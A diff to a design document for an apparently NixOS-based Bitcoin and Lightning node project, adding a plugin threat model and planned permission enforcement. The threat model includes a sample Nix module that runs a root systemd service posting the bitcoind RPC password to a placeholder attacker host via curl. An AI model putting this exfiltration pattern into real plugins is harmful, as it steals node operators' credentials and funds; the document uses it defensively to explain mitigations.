@@ -334,6 +334,57 @@ supply-chain concern or a wider audience.
 
 ## D14 — Permissions: declarative-informational now, enforcement later
 
+### Threat model (explicit)
+
+**Installing a plugin is equivalent to granting root.** A plugin's
+`plugin.nix` is a standard NixOS module — the module system is
+peer-equal and has no permission boundary. Every imported module
+receives the fully-evaluated `config` argument, which means any
+plugin can:
+
+- Read `config.services.bitcoind.rpc.password`,
+  `config.services.lnd.macaroons`, and every other secret in the
+  tree at evaluation time.
+- Declare systemd services, activation scripts, or cron jobs that
+  run as root at boot and exfiltrate those secrets (`curl -X POST
+  https://evil/… -d "pw=${config.…}"`).
+- Use `builtins.readFile` / `builtins.fetchurl` at eval time
+  against arbitrary paths.
+
+Concrete exploit shape:
+
+```nix
+{ config, pkgs, ... }: {
+  systemd.services.helpful-service = {
+    wantedBy = [ "multi-user.target" ];
+    script = ''
+      ${pkgs.curl}/bin/curl -X POST https://evil.example/x \
+        -d "pw=${config.services.bitcoind.rpc.password}"
+    '';
+  };
+}
+```
+
+Rebuild succeeds, service runs, secret leaves. The manifest
+`permissions` block **does not prevent this**; it's informational.
+
+This is a known, accepted risk for the Phase 1-5 technical-audience
+MVP, *not* an oversight. Mitigations rely on:
+
+- **Vetted-only default**: users install from
+  `nixblitz_official_plugins` or otherwise audit-reviewed sources.
+- **Explicit consent at install**: `plugin add` prints the
+  manifest's declared permissions + source URL and requires
+  `[y/N]` confirmation.
+- **Git-tracked diff visibility**: the entire plugin tree lands in
+  `~/nixblitz/plugins/<id>/` and Apply surfaces it in the review
+  diff. Reading the code before confirming rebuild is the user's
+  only real defense today.
+
+Phase 6 (see below) is what actually closes this hole.
+
+### Phase 1-5 behavior
+
 **Chosen**: `manifest.json` has a `permissions` block that plugins
 populate; the TUI prints these at `plugin add` time as part of the
 consent prompt. **No runtime enforcement** — plugin shell commands
@@ -375,15 +426,34 @@ gives the ecosystem a permission vocabulary to grow around —
 enforcement can be layered in later without breaking existing
 plugins because the manifest schema is already in place.
 
-**Follow-ups when enforcement lands**:
+**Follow-ups when enforcement lands (Phase 6)**:
 
-- Per-plugin system user, declared via plugin's `plugin.nix`.
+The module-system peer-equal-access problem from the threat model
+is the load-bearing piece. Addressing it requires:
+
+- **Per-plugin system user** with `DynamicUser=true`, declared via
+  the plugin's `plugin.nix` with core-provided helpers.
+- **No `config.*` reads across plugin boundaries**. Plugin services
+  run under their own user; any secret they legitimately need is
+  passed via systemd credential mounts (`LoadCredential`) scoped by
+  the manifest's permissions — not via `config.services.X.password`
+  templated into the unit's script.
+- Systemd hardening defaults on plugin-declared services:
+  `ProtectSystem=strict`, `RestrictAddressFamilies=...`,
+  `NoNewPrivileges=true`, explicit `RestrictNetwork` when the
+  manifest doesn't request `network: [outbound]`.
 - `bitcoin:read` → group membership (`bitcoin-public-rpc`) +
-  wrapper around `bitcoin-cli` that refuses write RPCs.
+  wrapper around `bitcoin-cli` that refuses write RPCs, exposed
+  only to plugin users that declared the capability.
 - `lightning:read` → wrapper around `lncli` / `lightning-cli` that
   refuses mutating RPCs.
-- Sandboxed command runner if / when audit reveals the manifest
-  command surface is being abused.
+- Sandboxed command runner (`systemd-run --user --property=…`) for
+  any manifest-declared shell commands that don't go through a
+  scoped wrapper.
+
+None of this is in scope before the ecosystem shows demand for
+third-party (i.e. non-vetted) plugins. Until then we rely on the
+explicit-consent + vetted-repo model.
 
 ---
 
